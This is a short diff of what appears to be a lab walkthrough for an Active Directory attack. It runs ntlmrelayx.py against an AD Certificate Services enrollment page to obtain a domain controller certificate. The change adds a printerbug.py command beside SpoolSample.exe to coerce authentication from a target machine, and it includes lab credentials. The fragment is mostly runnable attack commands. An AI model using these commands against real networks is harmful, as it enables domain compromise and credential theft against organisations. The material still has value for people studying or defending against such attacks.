@@ -26,9 +26,11 @@ On Kali
 python3 ntlmrelayx.py -t http://10.55.0.2/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 ```
 
-On Domain joined machine  
+Trigger PrinterBug  
 ```
 .\SpoolSample.exe 10.55.0.1 10.55.0.30
+or
+python3 printerbug.py mcafeelab.local/user123:SuperSecretPW@10.55.0.1 10.55.0.30
 ```
 
 On Attacker Windows or whereever we can run Rubeus  
